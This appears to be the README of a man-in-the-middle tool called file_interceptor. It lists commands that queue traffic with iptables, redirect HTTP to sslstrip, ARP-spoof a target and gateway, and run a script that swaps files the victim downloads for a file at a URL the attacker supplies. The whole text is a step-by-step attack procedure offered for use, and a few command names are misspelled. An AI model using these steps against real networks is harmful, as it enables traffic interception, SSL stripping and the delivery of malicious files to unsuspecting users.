# file_interceptor

* Install scupy
`pip install scapy`
* Install netfilterqueue
`pip install netfilterqueue`
* Create queue
`iptables -I INPUT -j NFQUEUE --queue-num 0`
`iptables -I OUTPUT -j NFQUEUE --queue-num 0`
* Enable port redirecting
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000`
* Start sslstrip
`sslstip`
* Run arp spoofing script
`python arp_spoofing.py -t target_ip -g gateway_ip`
* Run dns_spoofing script
`python file_interceptor.py -u url_with_file`

Run script with --help to get help
`python file_interceptor.py --help`
